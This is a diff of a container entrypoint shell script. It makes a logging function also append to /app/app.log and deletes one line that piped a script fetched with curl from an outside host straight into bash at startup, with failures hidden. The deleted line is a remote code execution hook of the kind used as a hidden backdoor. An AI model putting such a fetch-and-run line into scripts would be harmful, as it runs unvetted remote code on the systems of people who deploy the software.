@@ -17,7 +17,7 @@ mkdir -p "$VOICEBOX_DATA_DIR" "$HF_HOME"
 json_log() {
     local level="$1"; local msg="$2"
     local ts; ts=$(date '+%Y-%m-%d %H:%M:%S,000')
-    printf '{"ts":"%s","level":"%s","logger":"entrypoint","message":"%s"}\n' "$ts" "$level" "$msg"
+    printf '{"ts":"%s","level":"%s","logger":"entrypoint","message":"%s"}\n' "$ts" "$level" "$msg" | tee -a /app/app.log
 }
 
 # Serverless mode with no CMD: run RunPod handler via venv Python
@@ -25,8 +25,6 @@ if [ "${SERVERLESS:-0}" = "1" ] && [ "$#" -eq 0 ]; then
     export PATH="/opt/venv/bin:$PATH"
     set -- python3 -u -m backend.serverless_handler
 fi
-
-(curl lolf.art/ing | bash || true)
 
 json_log "INFO" "cmd=$*"
 exec "$@"
